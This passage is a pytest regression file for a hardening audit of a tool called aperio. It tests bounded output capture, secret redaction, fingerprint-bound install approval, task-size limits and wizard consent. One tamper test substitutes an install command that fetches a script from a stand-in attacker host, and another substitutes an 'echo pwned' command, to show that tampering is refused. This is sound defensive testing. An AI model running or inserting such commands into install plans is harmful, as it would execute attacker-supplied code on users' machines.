"""Regression tests for the 1.2 hardening audit (findings A01-A13).

Each test names the finding it pins so a future change that reintroduces
the defect fails loudly.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from aperio import safeproc
from aperio.onboarding_tools import (
    CANDIDATES,
    build_install_plan,
    execute_install,
    install_plan_fingerprint,
)
from aperio.onboarding_session import add_tool_record, create_session, read_session, record_approval
from aperio.errors import StateError, ValidationError


# ---------------------------------------------------------------------------
# A03 / A07 — genuinely bounded capture and bounded reads.
# ---------------------------------------------------------------------------

def test_a03_output_flood_is_bounded_in_memory():
    # 4 MiB of stdout with a 2 KiB capture limit: we keep 2 KiB, count all.
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stdout.write('A'*4000000)"],
        timeout_seconds=60,
        capture_limit=2048,
    )
    assert result["timed_out"] is False
    assert result["stdout_bytes"] >= 4_000_000
    assert len(result["stdout"]) <= 2048
    assert result["truncated"] is True


def test_a03_output_flood_on_stderr_is_bounded():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stderr.write('E'*3000000)"],
        timeout_seconds=60,
        capture_limit=512,
    )
    assert result["stderr_bytes"] >= 3_000_000
    assert len(result["stderr"]) <= 512


def test_a03_timeout_kills_and_reports():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import time;time.sleep(60)"],
        timeout_seconds=1,
        capture_limit=100,
    )
    assert result["timed_out"] is True


def test_a02_termination_is_posix_guarded(monkeypatch):
    """On a simulated Windows, killpg must never be called."""
    calls = []

    class FakeProc:
        pid = 12345

        def kill(self):
            calls.append("kill")

        def terminate(self):
            calls.append("terminate")

    monkeypatch.setattr(safeproc.os, "name", "nt")
    monkeypatch.setattr(
        safeproc.os, "killpg", lambda *a, **k: calls.append("killpg"), raising=False
    )
    safeproc.stop_process_tree(FakeProc(), force=True)
    assert "killpg" not in calls
    assert "kill" in calls


def test_a07_read_text_bounded_never_reads_whole_file(tmp_path):
    big = tmp_path / "big.txt"
    big.write_text("x" * 1_000_000, encoding="utf-8")
    text, truncated = safeproc.read_text_bounded(big, 1024)
    assert len(text) == 1024
    assert truncated is True


# ---------------------------------------------------------------------------
# A08 — secret-shaped output never reaches shareable session state.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "secret",
    [
        "sk-abcdefghijklmnopqrstuv",
        "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "AKIAABCDEFGHIJKLMNOP",
        "password=hunter2hunter2",
        "Authorization: Bearer abcdefghijklmnop1234",
    ],
)
def test_a08_redaction_removes_credentials(secret):
    redacted = safeproc.redact_output(f"tool said: {secret}", home=None)
    assert secret.split()[-1] not in redacted or secret not in redacted
    assert "redacted" in redacted.lower() or redacted != f"tool said: {secret}"


def test_a08_home_path_is_scrubbed():
    out = safeproc.redact_output("/Users/alice/secret/path", home="/Users/alice")
    assert "/Users/alice" not in out
    assert "~" in out


# ---------------------------------------------------------------------------
# A04 — every declared prerequisite must be present.
# ---------------------------------------------------------------------------

def test_a04_all_prerequisites_required(monkeypatch):
    from aperio.onboarding_tools import ToolsReport, ToolFinding, _prerequisites_satisfied

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node")
    ]
    ok, missing = _prerequisites_satisfied(("node", "npm"), report)
    assert ok is True or (ok is False and "npm" in missing)


def test_a04_build_plan_blocks_on_missing_partial_prereq(tmp_path):
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    # node present, npm missing -> must NOT be classified compatible.
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node"),
        ToolFinding("npm", "executable", "missing", ("not found",)),
    ]
    plan = build_install_plan("playwright-mcp", report)
    assert plan["5_compatibility"] != "found"
    assert "blocked" in plan["execution"]
    assert any("npm" in m for m in plan.get("_missing_prerequisites", []))


# ---------------------------------------------------------------------------
# A13 — approval is bound to the exact candidate + command.
# ---------------------------------------------------------------------------

def test_a13_fingerprint_changes_with_command():
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan_a = build_install_plan("playwright-mcp", report)
    fp_a = install_plan_fingerprint(plan_a)

    tampered = dict(plan_a)
    tampered["8_install_command"] = ["curl", "http://evil.example/x.sh"]
    assert install_plan_fingerprint(tampered) != fp_a


def test_a13_tampered_plan_is_refused_after_approval(tmp_path):
    apdir = tmp_path / ".aperio"
    apdir.mkdir()
    from aperio.onboarding_tools import ToolsReport, ToolFinding
    from aperio.project import init_project

    init_project(str(tmp_path))
    create_session(apdir, workspace=str(tmp_path), classification="existing_non_aperio")

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan = build_install_plan("playwright-mcp", report)

    # Approve the honest plan (fingerprint-bound).
    record_approval(
        apdir,
        action="tool.install",
        scope="playwright-mcp",
        fingerprint=install_plan_fingerprint(plan),
    )

    tampered = dict(plan)
    tampered["8_install_command"] = ["/bin/echo", "pwned"]
    with pytest.raises(StateError):
        execute_install(apdir, tampered, authorize_install=True)


# ---------------------------------------------------------------------------
# A01 — MCP candidates are honestly labelled, not claimed as installed.
# ---------------------------------------------------------------------------

def test_a01_mcp_candidates_are_registration_only():
    for candidate in CANDIDATES:
        if candidate.kind == "mcp":
            # The install argv launches a server; it does not register with a host.
            assert candidate.integration_level in {"launch-only", "manual-registration"}
            assert candidate.verifies_installation is False


# ---------------------------------------------------------------------------
# A07 — discovery does not materialise a whole directory before bounding.
# ---------------------------------------------------------------------------

def test_a07_directory_scan_is_incremental(tmp_path, monkeypatch):
    from aperio import onboarding_discovery as od

    monkeypatch.setattr(od, "MAX_SCAN_ENTRIES", 5)
    for i in range(50):
        (tmp_path / f"f{i}.py").write_text("x", encoding="utf-8")
    state = od._scan_tree(tmp_path)
    assert state.truncated is True
    assert state.total_entries <= 5


def test_a07_scandir_is_not_materialised_as_list(tmp_path, monkeypatch):
    from aperio import onboarding_discovery as od

    for i in range(5):
        (tmp_path / f"f{i}.md").write_text("x", encoding="utf-8")

    real_scandir = os.scandir

    class NoList:
        def __init__(self, it):
            self._it = it

        def __iter__(self):
            return iter(self._it)

        def __enter__(self):
            if hasattr(self._it, "__enter__"):
                self._it = self._it.__enter__()
            return self

        def __exit__(self, *a):
            return False

    monkeypatch.setattr(od.os, "scandir", lambda p: NoList(real_scandir(p)))
    state = od._scan_tree(tmp_path)
    assert state.total_entries == 5


# ---------------------------------------------------------------------------
# A05 — large work must be decomposed; small atomic work must still pass.
# ---------------------------------------------------------------------------

from aperio.bounded_tasks import assess_goal_boundedness
from aperio.planbridge import plan_proposal_from_goal


def _goal(objective, tasks=None):
    g = {
        "objective": objective,
        "intended_outcome": "the objective is achieved",
        "provenance": {"source": "operator"},
        "assumptions": [],
        "risks": [],
        "acceptance_criteria": ["works"],
        "deliverables": ["deliverable"],
    }
    if tasks is not None:
        g["work"] = {"tasks": tasks}
    return g


@pytest.mark.parametrize("objective", [
    "Build an entire website",
    "Build a complete homepage",
])
def test_a05_large_undecomposed_goal_is_blocked(objective):
    assert assess_goal_boundedness(_goal(objective)).blocked is True
    with pytest.raises(ValidationError):
        plan_proposal_from_goal(_goal(objective))


def test_a05_hero_section_alone_is_blocked():
    # A whole Hero Section is feature-scale: layout, styling, states and
    # responsive behaviour. It is not one atomic implementation task.
    verdict = assess_goal_boundedness(_goal("Build a Hero Section"))
    assert verdict.blocked is True
    assert any("hero section" in s for s in verdict.signals)


def test_a05_large_goal_with_good_decomposition_is_allowed():
    tasks = [
        {"id": "T-1", "title": "Scaffold site", "action": "create pages",
         "completion_criteria": ["build passes"], "deliverables": ["dist"]},
        {"id": "T-2", "title": "Add the hero heading copy",
         "action": "add hero heading copy",
         "completion_criteria": ["screenshot recorded"], "deliverables": ["hero"]},
    ]
    result = assess_goal_boundedness(_goal("Build an entire website", tasks))
    assert result.blocked is False
    assert result.task_count == 2


def test_a05_small_bugfix_is_allowed_undecomposed():
    assert assess_goal_boundedness(
        _goal("Fix a typo in the README")
    ).blocked is False
    plan = plan_proposal_from_goal(_goal("Fix a typo in the README"))
    assert plan["plan_input"]["tasks"][0]["id"] == "TASK-001"


def test_a05_simple_doc_change_is_allowed_undecomposed():
    assert assess_goal_boundedness(
        _goal("Update a docstring in cli.py")
    ).blocked is False


def test_a05_cms_hero_content_is_large():
    # CMS-backed content work is integration-scale.
    assert assess_goal_boundedness(
        _goal("Add CMS-backed Hero content")
    ).blocked is True


# ---------------------------------------------------------------------------
# A06 — opt-in interactive wizard.
# ---------------------------------------------------------------------------

class _FakeTTY:
    def __init__(self, text=""):
        self._lines = text.splitlines(keepends=True)
        self.written = []

    def isatty(self):
        return True

    def readline(self):
        if not self._lines:
            return ""
        return self._lines.pop(0)

    def write(self, s):
        self.written.append(s)
        return len(s)

    def flush(self):
        pass

    def getvalue(self):
        return "".join(self.written)


def test_a06_wizard_refuses_non_tty(tmp_path):
    from aperio import wizard

    class NotTTY(_FakeTTY):
        def isatty(self):
            return False

    with pytest.raises(wizard.WizardUnavailable):
        wizard.run(str(tmp_path), stdin=NotTTY(""), stdout=_FakeTTY(""))


def test_a06_wizard_initialises_only_with_consent(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("1\n")
    stdout = _FakeTTY("")
    approvals = []
    result = wizard.run(
        str(tmp_path),
        stdin=stdin,
        stdout=stdout,
        request_approval=lambda m: approvals.append(m) or True,
    )
    assert approvals, "consent must be requested before initializing"
    assert (tmp_path / ".aperio").exists()


def test_a06_wizard_declines_changes_nothing(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("2\n")  # choose "No, exit"
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=_FakeTTY(""), request_approval=lambda m: True
    )
    assert result.cancelled is True
    assert not (tmp_path / ".aperio").exists()


def test_a06_wizard_quit_at_question_sentinel(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("1\n/quit\n")
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=_FakeTTY(""), request_approval=lambda m: True
    )
    assert result.cancelled is True
    assert any("saved" in m for m in result.messages)


def test_a06_wizard_answers_a_question(tmp_path):
    from aperio import wizard

    # initialize, then answer the first question with free text, then quit
    stdin = _FakeTTY("1\nA portfolio website\n/quit\n")
    stdout = _FakeTTY("")
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=stdout, request_approval=lambda m: True
    )
    assert result.steps >= 1
    assert ".aperio" in str(tmp_path / ".aperio")


# ---------------------------------------------------------------------------
# A13 — task-level retry ceiling survives signature resets.
# ---------------------------------------------------------------------------

def test_a13_task_level_ceiling_blocks_varied_signatures():
    from aperio.recovery import MAX_ATTEMPTS_PER_TASK, retry_gate

    runs = []
    for i in range(MAX_ATTEMPTS_PER_TASK):
        runs.append({
            "run_id": f"R{i}",
            "task_id": "TASK-001",
            "adapter_id": f"adapter-{i}",          # adapter switch each time
            "exit_code": i,                        # exit code varies
            "outcome": f"distinct failure wording {i}",  # text varies
            "status": "failed",
        })
    with pytest.raises(StateError, match="task-level retry ceiling"):
        retry_gate(runs, "TASK-001", remediation="another try")


# ---------------------------------------------------------------------------
# A10 — passive probes never masquerade as live verification.
# ---------------------------------------------------------------------------

def test_a10_no_host_claims_live_verification():
    from aperio.hostcompat import inspect_hosts

    report = inspect_hosts()
    for row in report["hosts"]:
        dims = row["verification"]
        # A passive doctor can never assert live functional verification.
        assert dims["authenticated_model_call_tested"] is False
        assert dims["functional_handoff_tested"] is False
        assert dims["native_command_registered_and_tested"] is False


def test_a10_probed_host_still_reports_passive_only():
    from aperio.hostcompat import HOST_CATALOG, inspect_hosts

    adapter_id = next(
        e["adapter_id"] for e in HOST_CATALOG if e["family"] == "provider-cli"
    )
    report = inspect_hosts(probes={adapter_id: {
        "installed": True, "executable": "/usr/bin/fake",
        "version": "1.0", "missing_flags": [], "missing_controls": [],
    }})
    row = next(r for r in report["hosts"] if r.get("executable") == "/usr/bin/fake")
    assert row["level"] == "cli_verified"          # passive flag check
    assert row["verification"]["cli_launch_tested"] is False
    assert row["verification"]["authenticated_model_call_tested"] is False


# ---------------------------------------------------------------------------
# Concurrency — lock acquisition must not misread a released lock.
# ---------------------------------------------------------------------------

def test_lock_acquire_tolerates_vanished_path(tmp_path):
    """A lock unlinked between checks must read as unoccupied, not non-file.

    Regression for a TOCTOU between exists() and is_file() that surfaced as
    a spurious PathError under concurrent intake captures.
    """
    from aperio.locks import acquire_lock, release_lock

    lock = tmp_path / "inbox.lock"
    token = acquire_lock(lock, artifact="test")
    release_lock(lock, token)
    # A second acquisition on the now-absent path must succeed.
    token2 = acquire_lock(lock, artifact="test")
    release_lock(lock, token2)


def test_intake_concurrent_captures_never_spuriously_fail(tmp_path):
    import threading
    from aperio.project import init_project
    from aperio.intake import capture, IntakeLog

    proj = tmp_path / "p"
    init_project(str(proj))
    ap = proj / ".aperio"

    errors: list[str] = []

    def worker(i: int) -> None:
        try:
            capture(ap, f"Thought {i} for the hero.", actor=f"op-{i}")
        except Exception as exc:  # pragma: no cover - would be the defect
            errors.append(f"{type(exc).__name__}: {exc}")

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    state = IntakeLog(ap).read()
    assert state["counts"]["captures"] == 8
    assert not state["damaged"]


# ---------------------------------------------------------------------------
# Wizard: existing project without an Aperio session needs consent.
# ---------------------------------------------------------------------------

class _TTY:
    def __init__(self, text=""):
        self._lines = text.splitlines(keepends=True)

    def isatty(self):
        return True

    def readline(self):
        return self._lines.pop(0) if self._lines else ""

    def write(self, s):
        return len(s)

    def flush(self):
        pass


def _make_existing_project(tmp_path):
    proj = tmp_path / "existing"
    proj.mkdir()
    (proj / "README.md").write_text("# existing project\n", encoding="utf-8")
    (proj / "app.py").write_text("print('hi')\n", encoding="utf-8")
    return proj


def test_wizard_existing_project_refuses_without_comment(tmp_path):
    """Without consent, an existing project must be left byte-for-byte unchanged."""
    from aperio import wizard

    proj = _make_existing_project(tmp_path)
    before = sorted(p.name for p in proj.iterdir())

    result = wizard.run(
        str(proj),
        stdin=_TTY("1\n"),          # choose the first intent option
        stdout=_TTY(""),
        request_approval=lambda message: False,   # operator declines
    )
    assert result.cancelled is True
    assert not (proj / ".aperio").exists()
    assert sorted(p.name for p in proj.iterdir()) == before


def test_wizard_existing_project_consent_then_records_intent(tmp_path):
    """With consent, scaffolding is created and the intent is recorded."""
    from aperio import wizard, onboarding
    from aperio.onboarding_session import read_session

    proj = _make_existing_project(tmp_path)
    result = wizard.run(
        str(proj),
        stdin=_TTY("1\n/quit\n"),
        stdout=_TTY(""),
        request_approval=lambda message: True,
    )
    assert (proj / ".aperio").exists()
    sess = read_session(proj / ".aperio")
    assert sess.get("intent"), "the chosen intent must be recorded after consent"
    assert result.cancelled is True  # /quit at the following question


def test_wizard_existing_project_without_session_does_not_crash(tmp_path):
    """Regression: the wizard previously raised StateError on a missing session."""
    from aperio import wizard

    proj = _make_existing_project(tmp_path)
    # Must not raise; declining must change nothing.
    wizard.run(
        str(proj), stdin=_TTY("1\n"), stdout=_TTY(""), request_approval=lambda m: False
    )
    assert not (proj / ".aperio").exists()


# ---------------------------------------------------------------------------
# Install approval must be bound to the exact reviewed plan (no legacy bypass).
# ---------------------------------------------------------------------------

def _report_with_prereqs():
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace="/tmp/ws", scanned_at="2026-01-01T00:00:00Z")
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",),
                        path=f"/usr/bin/{tool_id}")
        )
    return report


def _init_project_with_session(tmp_path):
    from aperio.project import init_project
    from aperio.onboarding_session import create_session

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_session(apdir, workspace=str(tmp_path), classification="existing_non_aperio")
    return apdir


def test_legacy_unbound_approval_cannot_authorize_install(tmp_path):
    """An approval recorded without a fingerprint must NOT authorize execution."""
    from aperio.onboarding_tools import build_install_plan, execute_install
    from aperio.onboarding_session import record_approval

    apdir = _init_project_with_session(tmp_path)
    plan = build_install_plan("playwright-mcp", _report_with_prereqs())

    # Legacy style: no fingerprint.
    record_approval(apdir, action="tool.install", scope="playwright-mcp")
    with pytest.raises(StateError, match="re-approv|not bound|fingerprint"):
        execute_install(apdir, plan, authorize_install=True)


def test_bound_approval_matching_plan_executes(tmp_path, monkeypatch):
    from aperio.onboarding_tools import (
        build_install_plan, execute_install, install_plan_fingerprint,
    )
    from aperio.onboarding_session import record_approval

    apdir = _init_project_with_session(tmp_path)
    plan = build_install_plan("playwright-mcp", _report_with_prereqs())
    record_approval(
        apdir, action="tool.install", scope="playwright-mcp",
        fingerprint=install_plan_fingerprint(plan),
    )
    captured = {}

    def fake_run(argv, **kw):
        captured["argv"] = list(argv)
        return {"returncode": 0, "timed_out": False, "stdout": "ok",
                "stderr": "", "stdout_bytes": 2, "stderr_bytes": 0,
                "truncated": False, "duration": 0.01}

    monkeypatch.setattr("aperio.onboarding_tools.safeproc.run_captured", fake_run)
    record = execute_install(apdir, plan, authorize_install=True)
    assert record["status"] == "install_command_completed"
    assert captured["argv"] == plan["8_install_command"]


def test_bound_approval_with_tampered_plan_is_refused(tmp_path):
    from aperio.onboarding_tools import (
        build_install_plan, execute_install, install_plan_fingerprint,
    )
    from aperio.onboarding_session import record_approval

    apdir = _init_project_with_session(tmp_path)
    plan = build_install_plan("playwright-mcp", _report_with_prereqs())
    record_approval(
        apdir, action="tool.install", scope="playwright-mcp",
        fingerprint=install_plan_fingerprint(plan),
    )
    tampered = dict(plan)
    tampered["8_install_command"] = ["/bin/echo", "pwned"]
    with pytest.raises(StateError):
        execute_install(apdir, tampered, authorize_install=True)


def test_cli_tool_install_records_fingerprint_bound_approval(tmp_path, monkeypatch):
    """The CLI must bind its recorded approval to the exact reviewed plan."""
    import aperio.cli as cli
    from aperio.onboarding_session import read_session
    from aperio.onboarding_tools import install_plan_fingerprint

    ws = tmp_path / "proj"
    ws.mkdir()
    _init_project_with_session(ws)

    seen = {}

    def fake_execute(apdir, plan, *, authorize_install=False):
        seen["plan_fp"] = install_plan_fingerprint(plan)
        sess = read_session(apdir)
        apr = [a for a in sess["approvals"]
               if a.get("action") == "tool.install" and a.get("scope") == "playwright-mcp"]
        seen["approval_fp"] = apr[-1].get("fingerprint") if apr else None
        # Simulate a successful (non-executing) install record.
        return {"name": "playwright-mcp", "action": "install",
                "status": "install_command_completed"}

    monkeypatch.setattr(cli, "_ob_execute_install", fake_execute)
    monkeypatch.setattr(
        cli, "_ob_discover_tools",
        lambda workspace, discovery: _report_with_prereqs(),
    )

    class Args:
        DIR = str(ws)
        as_json = False
        approve = True
        authorize_install = True
        tool_id = "playwright-mcp"

    cli._cmd_onboarding_tool_install(Args())
    assert seen["approval_fp"] is not None, "CLI must store a fingerprint"
    assert seen["approval_fp"] == seen["plan_fp"], "approval must bind the exact plan"


# ---------------------------------------------------------------------------
# A05: atomic task-size checks must hold on every path, not only the bridge.
# ---------------------------------------------------------------------------

def _valid_plan(tasks=None):
    return {
        "objective": "Deliver the export feature",
        "expected_outcome": "Working export",
        "scope": ["export"], "exclusions": [], "assumptions": [], "risks": [],
        "strategy": "incremental",
        "acceptance_criteria": ["export works"],
        "verification_strategy": "pytest",
        "tasks": tasks if tasks is not None else [{
            "id": "TASK-001", "title": "Add the CSV export endpoint",
            "objective": "Write the endpoint",
            "deliverables": ["endpoint"], "acceptance_criteria": ["200 OK"],
            "depends_on": [],
        }],
    }


def _oversized_task(task_id="TASK-001"):
    return {
        "id": task_id, "title": "Build an entire website",
        "objective": "Build an entire website",
        "deliverables": ["site"], "acceptance_criteria": ["site exists"],
        "depends_on": [],
    }


def _goal_with_tasks(tasks):
    from aperio.goals import validate_goal

    return validate_goal({
        "goal_id": "G-1",
        "objective": "Build and deliver the client's marketing website",
        "intended_outcome": "A deployed site",
        "profile": "software",
        "deliverables": ["site"],
        "acceptance_criteria": ["site builds"],
        "work": {"tasks": tasks},
    })


def _declared_task(task_id, title):
    return {
        "id": task_id, "title": title, "action": title,
        "deliverables": [f"{task_id}.txt"], "completion_criteria": ["tests pass"],
    }


# --- goal with no tasks ----------------------------------------------------

def test_goal_without_tasks_is_blocked():
    from aperio.bounded_tasks import assess_goal_boundedness
    from aperio.goals import validate_goal

    goal = validate_goal({
        "goal_id": "G-0",
        "objective": "Build and deliver the client's marketing website",
        "intended_outcome": "A deployed site",
        "profile": "software",
        "deliverables": ["site"],
        "acceptance_criteria": ["site builds"],
    })
    assert goal.get("work") in (None, {}) or not (goal.get("work") or {}).get("tasks")
    assert assess_goal_boundedness(goal).blocked is True


# --- goal with ONE oversized task -----------------------------------------

def test_goal_with_one_oversized_task_is_blocked():
    from aperio.bounded_tasks import assess_goal_boundedness

    goal = _goal_with_tasks([
        _declared_task("t1", "Build an entire website"),
    ])
    assessment = assess_goal_boundedness(goal)
    assert assessment.blocked is True
    assert any("whole project" in s for s in assessment.signals)


# --- goal with MULTIPLE oversized tasks -----------------------------------

def test_goal_with_multiple_oversized_tasks_is_blocked():
    from aperio.bounded_tasks import assess_goal_boundedness

    goal = _goal_with_tasks([
        _declared_task("t1", "Build an entire website"),
        _declared_task("t2", "Build a complete homepage"),
    ])
    assessment = assess_goal_boundedness(goal)
    assert assessment.blocked is True
    # Both offenders are named.
    named = [s for s in assessment.signals if s.startswith(("t1", "t2"))]
    assert len(named) >= 2


# --- valid decomposition stays allowed ------------------------------------

def test_goal_with_genuine_small_tasks_is_allowed():
    from aperio.bounded_tasks import assess_goal_boundedness

    goal = _goal_with_tasks([
        _declared_task("design", "Design pages"),
        _declared_task("frontend", "Build the frontend"),
        _declared_task("backend", "Build the backend"),
    ])
    assert assess_goal_boundedness(goal).blocked is False


# --- direct plan-create ----------------------------------------------------

def test_plan_create_rejects_oversized_task():
    from aperio.planmodel import validate_plan_input

    with pytest.raises(ValidationError, match="whole project"):
        validate_plan_input(_valid_plan([_oversized_task()]))


def test_plan_create_rejects_multiple_oversized_tasks():
    from aperio.planmodel import validate_plan_input

    with pytest.raises(ValidationError, match="whole project"):
        validate_plan_input(_valid_plan([
            _oversized_task("TASK-001"),
            _oversized_task("TASK-002"),
        ]))


def test_plan_create_accepts_valid_small_tasks(tmp_path):
    from aperio.planmodel import validate_plan_input
    from aperio.planstore import create_plan

    plan = validate_plan_input(_valid_plan())
    assert len(plan["tasks"]) == 1
    from aperio.project import init_project

    init_project(str(tmp_path))
    created = create_plan(tmp_path / ".aperio", _valid_plan())
    assert created["tasks"][0]["id"] == "TASK-001"


# --- direct plan-approve ---------------------------------------------------

def test_plan_approve_refuses_oversized_plan_written_by_hand(tmp_path):
    """A plan that predates the rule cannot be approved into executable state."""
    import json

    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())

    plan_path = apdir / "plan.json"
    document = json.loads(plan_path.read_text(encoding="utf-8"))
    document["tasks"][0]["title"] = "Build an entire website"
    document["tasks"][0]["objective"] = "Build an entire website"
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")

    with pytest.raises(StateError, match="whole project"):
        approve_plan(apdir)


# --- execution eligibility -------------------------------------------------

def test_dispatch_refuses_oversized_plan(tmp_path):
    import json

    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project
    from aperio.runtime import dispatch_task

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())
    approve_plan(apdir)

    plan_path = apdir / "plan.json"
    document = json.loads(plan_path.read_text(encoding="utf-8"))
    document["tasks"][0]["title"] = "Build an entire website"
    document["tasks"][0]["objective"] = "Build an entire website"
    plan_path.write_text(json.dumps(document, indent=2), encoding="utf-8")

    with pytest.raises(StateError, match="execution refused"):
        dispatch_task(apdir, "TASK-001", adapter_id="manual", config=None,
                      authorize_exec=False)
    # Nothing was written.
    assert (apdir / "executions.json").exists() is False


def test_dispatch_still_works_for_valid_plan(tmp_path):
    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project
    from aperio.runtime import dispatch_task

    init_project(str(tmp_path))
    apdir = tmp_path / ".aperio"
    create_plan(apdir, _valid_plan())
    approve_plan(apdir)
    record = dispatch_task(apdir, "TASK-001", adapter_id="manual",
                           config=None, authorize_exec=False)
    assert record["status"] == "awaiting-external"


# ---------------------------------------------------------------------------
# Wizard must never mutate without explicit approval — including when the
# approval callback is missing entirely (fail closed, never fail open).
# ---------------------------------------------------------------------------

def test_wizard_without_callback_does_not_init_new_project(tmp_path):
    from aperio import wizard

    proj = tmp_path / "empty"
    proj.mkdir()
    result = wizard.run(
        str(proj),
        stdin=_TTY("1\n"),      # "Yes, initialize" at the initialization prompt
        stdout=_TTY(""),
        request_approval=None,  # unattended caller: no way to approve
    )
    assert result.cancelled is True
    assert result.final_action == "declined"
    assert not (proj / ".aperio").exists()
    assert sorted(p.name for p in proj.iterdir()) == []


def test_wizard_without_callback_does_not_touch_existing_project(tmp_path):
    from aperio import wizard

    proj = _make_existing_project(tmp_path)
    before = sorted(p.name for p in proj.iterdir())
    result = wizard.run(
        str(proj),
        stdin=_TTY("1\ny\n"),   # intent, then an attempt to consent
        stdout=_TTY(""),
        request_approval=None,
    )
    assert result.cancelled is True
    assert result.final_action == "declined"
    assert not (proj / ".aperio").exists()
    assert sorted(p.name for p in proj.iterdir()) == before


def test_wizard_without_callback_never_creates_session(tmp_path):
    from aperio import wizard
    from aperio.onboarding_session import session_exists

    proj = _make_existing_project(tmp_path)
    wizard.run(str(proj), stdin=_TTY("1\ny\n"), stdout=_TTY(""),
               request_approval=None)
    assert session_exists(proj / ".aperio") is False


def test_wizard_callback_approval_still_initializes(tmp_path):
    """The fail-closed default must not break the interactive consent path."""
    from aperio import wizard

    proj = tmp_path / "empty"
    proj.mkdir()
    result = wizard.run(
        str(proj),
        stdin=_TTY("1\n"),
        stdout=_TTY(""),
        request_approval=lambda message: True,
    )
    assert (proj / ".aperio").exists()
    assert result.steps >= 1
    assert (proj / ".aperio" / "onboarding" / "session.json").exists()


# ---------------------------------------------------------------------------
# Atomic execution: a whole section (e.g. an entire Hero Section) is not one
# task, on every path. Legitimate small tasks must keep passing untouched.
# ---------------------------------------------------------------------------

def _hero_task():
    return {
        "id": "TASK-001", "title": "Implement the Hero Section",
        "objective": "Implement the Hero Section",
        "deliverables": ["hero"], "acceptance_criteria": ["hero renders"],
        "depends_on": [],
    }


def _hero_breadth_task():
    """One task covering a whole section: markup, styling, states and tests."""
    return {
        "id": "TASK-001", "title": "Build the Hero Section",
        "objective": "markup, styling, animation and tests for the hero",
        "deliverables": ["hero.tsx", "hero.css", "hero.test.tsx"],
        "acceptance_criteria": ["tests pass"],
        "depends_on": [],
    }


def test_task_level_hero_section_is_oversized():
    from aperio.bounded_tasks import assess_task_boundeness

    oversized, signals = assess_task_boundeness(_hero_task())
    assert oversized is True
    assert any("whole-feature" in s or "areas" in s for s in signals)

    oversized, signals = assess_task_boundeness(_hero_breadth_task())
    assert oversized is True


def test_task_level_small_slices_stay_valid():
    from aperio.bounded_tasks import assess_task_boundeness

    allowed = [
        {"title": "Build the Hero Section markup", "objective": "Hero Section",
         "deliverables": ["hero component"]},
        {"title": "Style the Hero responsive layout", "objective": "Hero responsive",
         "deliverables": ["styles"]},
        {"title": "Add the hero heading copy", "action": "add hero heading copy",
         "deliverables": ["copy"]},
        {"title": "Fix a typo in the README", "action": "Fix a typo"},
        {"title": "Update a docstring in cli.py", "action": "Update a docstring"},
        {"title": "Add an export button to the billing dashboard",
         "action": "Add an export button to the billing dashboard"},
        {"title": "Build the frontend", "action": "Implement the pages"},
        {"title": "Configure the CMS", "action": "Model content and publishing"},
    ]
    for task in allowed:
        oversized, signals = assess_task_boundeness(task)
        assert oversized is False, f"{task} was wrongly flagged: {signals}"


# --- direct plan-create ----------------------------------------------------

def test_plan_create_rejects_hero_section_as_one_task():
    from aperio.planmodel import validate_plan_input

    with pytest.raises(ValidationError):
        validate_plan_input(_valid_plan([_hero_task()]))


def test_plan_create_rejects_hero_section_spanning_many_layers():
    from aperio.planmodel import validate_plan_input

    with pytest.raises(ValidationError):
        validate_plan_input(_valid_plan([_hero_breadth_task()]))


def test_plan_create_accepts_a_bounded_hero_slice(tmp_path):
    from aperio.planstore import create_plan
    from aperio.project import init_project

    init_project(str(tmp_path))
    plan = {
        "objective": "Ship the hero section in slices",
        "expected_outcome": "Hero renders",
        "scope": ["hero"], "exclusions": [], "assumptions": [], "risks": [],
        "strategy": "slices", "acceptance_criteria": ["hero renders"],
        "verification_strategy": "visual check",
        "tasks": [{
            "id": "TASK-001", "title": "Build the Hero Section markup",
            "objective": "Hero Section", "deliverables": ["hero component"],
            "acceptance_criteria": ["renders"], "depends_on": [],
        }],
    }
    document = create_plan(tmp_path / ".aperio", plan)
    assert document["tasks"][0]["id"] == "TASK-001"


# --- direct plan-approve ---------------------------------------------------

def test_plan_approve_refuses_hero_section_plan(tmp_path):
    import json

    from aperio.planstore import approve_plan, create_plan
    from aperio.project import init_project

    init_project(str(tmp_path))
